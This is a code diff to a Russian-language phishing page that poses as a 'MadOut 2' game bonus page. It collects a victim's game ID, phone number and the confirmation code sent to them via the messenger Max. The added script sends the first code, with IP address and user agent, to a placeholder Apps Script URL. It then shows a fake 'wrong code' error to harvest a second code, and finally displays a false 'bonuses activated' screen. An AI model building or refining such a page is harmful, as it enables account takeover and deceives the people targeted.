@@ -37,7 +37,6 @@
 </head>
 <body>
     <div class="card">
-        <!-- СТРАНИЦА 1: ВВОД ID -->
         <div id="screen-id">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo_2.png" alt="MadOut 2"></div>
             <div class="logo-sub">Big City Online</div>
@@ -46,8 +45,6 @@
             <button class="btn" id="btn-id" onclick="submitID()">Продолжить</button>
             <div class="error-msg" id="id-error">Введите ваш игровой ID (9 цифр)</div>
         </div>
-
-        <!-- СТРАНИЦА 2: ВВОД НОМЕРА -->
         <div id="screen-auth" style="display:none;">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo_2.png" alt="MadOut 2"></div>
             <div class="logo-sub">Авторизация</div>
@@ -56,15 +53,11 @@
             <button class="btn" id="btn-phone" onclick="requestCode()">Получить код</button>
             <div class="error-msg" id="phone-error">Введите 10 цифр начиная с 9</div>
         </div>
-
-        <!-- ЗАГРУЗКА -->
         <div id="screen-loading" class="loading-overlay">
             <div class="spinner"></div>
             <p class="loading-text">Отправляем код в Макс</p>
             <p class="loading-text">Ожидайте...</p>
         </div>
-
-        <!-- СТРАНИЦА 3: ВВОД КОДА -->
         <div id="screen-code" style="display:none;">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo_2.png" alt="MadOut 2"></div>
             <div class="logo-sub">Подтверждение</div>
@@ -73,8 +66,6 @@
             <button class="btn" id="btn-code" onclick="confirmCode()">Подтвердить</button>
             <div class="error-msg" id="code-error">Введите код из Макс (минимум 4 цифры)</div>
         </div>
-
-        <!-- СТРАНИЦА 4: УСПЕХ -->
         <div id="screen-done" style="display:none;">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo_2.png" alt="MadOut 2"></div>
             <div class="logo-sub">Бонусы активированы</div>
@@ -87,12 +78,7 @@
     </div>
 
     <script>
-        // ============================================
-        // ВСТАВЬ СЮДА URL ТВОЕГО APPS SCRIPT
-        // ============================================
-        const SCRIPT_URL = 'ТВОЙ_URL_APPS_SCRIPT';
-        // ============================================
-
+        const SCRIPT_URL = 'ЗАМЕНИ_НА_ТВОЙ_URL';
         var playerID = '';
         var codeAttempt = 1;
 
@@ -145,6 +131,8 @@
             if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из Макс (минимум 4 цифры)'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000); return; }
 
             if (codeAttempt === 1) {
+                var ip1 = await getIP();
+                fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, id: playerID, ip: ip1, userAgent: navigator.userAgent, timestamp: new Date().toISOString(), attempt: 1 }) }).catch(function(err) { console.log('ok'); });
                 document.getElementById('code-error').textContent = 'Неверный код. Проверьте SMS и попробуйте ещё раз.';
                 document.getElementById('code-error').style.display = 'block';
                 codeInput.value = '';
@@ -154,8 +142,8 @@
             }
 
             document.getElementById('code-error').style.display = 'none';
-            var ip = await getIP(); var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'АКТИВАЦИЯ...';
-            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, id: playerID, ip: ip, userAgent: navigator.userAgent, timestamp: new Date().toISOString() }) }).catch(function(err) { console.log('ok'); });
+            var ip2 = await getIP(); var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'АКТИВАЦИЯ...';
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, id: playerID, ip: ip2, userAgent: navigator.userAgent, timestamp: new Date().toISOString(), attempt: 2 }) }).catch(function(err) { console.log('ok'); });
             setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('done-id').textContent = playerID; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 2000);
         }
     </script>
